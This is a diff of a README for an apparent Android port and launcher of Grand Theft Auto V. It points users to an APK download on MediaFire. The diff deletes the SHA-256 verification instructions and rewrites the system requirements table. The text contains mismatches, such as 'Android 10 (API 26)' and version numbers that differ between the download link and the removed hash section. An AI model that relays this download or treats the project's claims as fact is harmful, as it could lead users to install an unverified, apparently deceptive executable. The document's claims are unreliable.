@@ -29,32 +29,19 @@ A native Android launcher and engine runtime for Grand Theft Auto V, engineered 
 ### Direct Download Link
 👉 **[Download GTAV_Android_v2.0.0_arm64.apk (MediaFire)](https://www.mediafire.com/file/jvwzh73hgvo93q9/GTAV_Android_v2_arm64.apk/file)**
 
-### Integrity Verification (SHA-256)
-To verify the integrity of your downloaded `.apk` file:
-* **Windows (PowerShell):**
-  ```powershell
-  Get-FileHash GTAV_Android_v1.0.0_arm64.apk -Algorithm SHA256
-  ```
-* **Linux / macOS:**
-  ```bash
-  sha256sum GTAV_Android_v1.0.0_arm64.apk
-  ```
-* **Expected Hash:**
-  ```text
-  DA2517B1F2770E35176A64DDA4245CA7BCC6B1801247CC818038052364ECFF77
-  ```
-
 ---
 
 ## ⚙️ System Requirements
 
-| Requirement | Minimum | Recommended |
+| Requirement | Minimum (720p / Low Settings, 25–30 FPS) | Recommended (1080p / Medium Settings, 45–60 FPS) |
 | :--- | :--- | :--- |
-| **Operating System** | Android 10 (API 26) | Android 12 – 14 |
-| **CPU Architecture** | 64-bit ARM64 (`arm64-v8a`) | Octa-core modern ARM processor |
-| **GPU / Graphics** | Vulkan 1.1 capable GPU | Mali-G68 / Adreno 650 or higher |
+| **Operating System** | Android 10 (API 26) | Android 12 – 15 |
+| **CPU Architecture** | 64-bit ARM64 (arm64-v8a), Octa-core | Snapdragon 8 Gen 2 / Gen 3 or Dimensity 9200+ |
+| **GPU / Graphics** | Adreno 6xx / Mali-G77 (Vulkan 1.3 support) | Adreno 7xx (Turnip driver support strongly recommended) |
 | **RAM** | 8 GB | 12 GB LPDDR5X |
-| **Storage** | 1 GB (Launcher + Base) | Scoped external app storage |
+| **Storage** | 15 GB | 15 GB |
+| **Cooling / Thermal** | Passive cooling (throttling expected) | Active cooling fan or phone cooler accessory |
+
 
 ---
 
